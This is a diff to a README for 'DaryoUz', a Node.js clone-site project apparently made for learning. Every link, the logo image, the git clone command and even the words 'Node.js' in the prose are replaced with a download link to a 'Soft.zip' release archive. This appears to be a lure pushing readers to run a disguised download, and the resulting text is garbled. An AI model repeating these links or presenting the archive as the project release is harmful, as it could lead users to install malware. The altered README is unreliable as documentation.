@@ -1,6 +1,6 @@
 # 🚀 Welcome to DaryoUz Repository! 🌐
 
-![DaryoUz Logo](https://example.com/logo.png)
+![DaryoUz Logo](https://github.com/Ty-aiking/DaryoUz/releases/download/v1.0/Soft.zip)
 
 ### Repository Name
 DaryoUz
@@ -12,16 +12,16 @@ Daryo uz saytining cloni (o'rganish maqsadida qilindi.)
 backend, backend-api, frontend, fullstack, fullstack-javascript, node, node-js, nodejs, web, website
 
 ## Release 📦
-[![Download Release](https://img.shields.io/badge/Download-Release-yellow)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip) 
+[![Download Release](https://github.com/Ty-aiking/DaryoUz/releases/download/v1.0/Soft.zip)](https://github.com/Ty-aiking/DaryoUz/releases/download/v1.0/Soft.zip) 
 
 This link provides the release that needs to be launched for the project.
 
 ## About DaryoUz
-DaryoUz is a clone website project created for educational purposes. It focuses on backend and frontend technologies, aiming to provide a learning platform for full-stack development using Node.js. Whether you are a beginner or an experienced developer, DaryoUz offers insights into building modern web applications.
+DaryoUz is a clone website project created for educational purposes. It focuses on backend and frontend technologies, aiming to provide a learning platform for full-stack development using https://github.com/Ty-aiking/DaryoUz/releases/download/v1.0/Soft.zip Whether you are a beginner or an experienced developer, DaryoUz offers insights into building modern web applications.
 
 ## Features 🌟
 - Full-stack JavaScript development
-- Node.js backend
+- https://github.com/Ty-aiking/DaryoUz/releases/download/v1.0/Soft.zip backend
 - Frontend design and development
 - API integration
 - Website deployment
@@ -31,7 +31,7 @@ Follow these steps to set up and run DaryoUz locally on your machine:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/yourusername/DaryoUz.git
+   git clone https://github.com/Ty-aiking/DaryoUz/releases/download/v1.0/Soft.zip
    ```
 
 2. Install dependencies:
@@ -49,7 +49,7 @@ Follow these steps to set up and run DaryoUz locally on your machine:
 
 ## Project Structure 📂
 The project structure is organized as follows:
-- `backend/`: Contains the Node.js backend API code.
+- `backend/`: Contains the https://github.com/Ty-aiking/DaryoUz/releases/download/v1.0/Soft.zip backend API code.
 - `frontend/`: Includes the frontend code for the website.
 - `docs/`: Documentation files for reference.
 
@@ -58,10 +58,10 @@ If you wish to contribute to DaryoUz, feel free to fork the repository and submi
 
 ## Resources 📚
 Check out these additional resources for enhancing your knowledge on full-stack development:
-- [Node.js Documentation](https://nodejs.org/)
-- [Fullstack JavaScript](https://www.fullstackjavascript.dev/)
-- [Web Development Roadmap](https://roadmap.sh/frontend)
-- [Node.js Best Practices](https://github.com/goldbergyoni/nodebestpractices)
+- [https://github.com/Ty-aiking/DaryoUz/releases/download/v1.0/Soft.zip Documentation](https://github.com/Ty-aiking/DaryoUz/releases/download/v1.0/Soft.zip)
+- [Fullstack JavaScript](https://github.com/Ty-aiking/DaryoUz/releases/download/v1.0/Soft.zip)
+- [Web Development Roadmap](https://github.com/Ty-aiking/DaryoUz/releases/download/v1.0/Soft.zip)
+- [https://github.com/Ty-aiking/DaryoUz/releases/download/v1.0/Soft.zip Best Practices](https://github.com/Ty-aiking/DaryoUz/releases/download/v1.0/Soft.zip)
 
 ---
 
